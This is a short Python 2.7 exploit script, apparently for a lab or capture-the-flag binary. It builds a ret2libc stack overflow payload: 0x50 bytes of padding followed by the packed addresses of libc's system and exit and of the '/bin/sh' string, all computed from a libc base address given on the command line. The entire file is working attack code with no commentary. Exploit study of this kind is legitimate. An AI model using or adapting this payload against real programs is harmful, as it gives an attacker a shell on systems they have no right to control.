#! /usr/bin/python2.7

import struct
import sys

baddr = int(sys.argv[1], 16) # address where libc loads
system_off = baddr + 0x00038fb0
exit_off = baddr + 0x0002f0c0
binsh_off = baddr + 0x11f3bf

pad = 'A' * 0x50

payload = pad + struct.pack("I", system_off) + struct.pack("I", exit_off) + struct.pack("I", binsh_off)
print(payload)
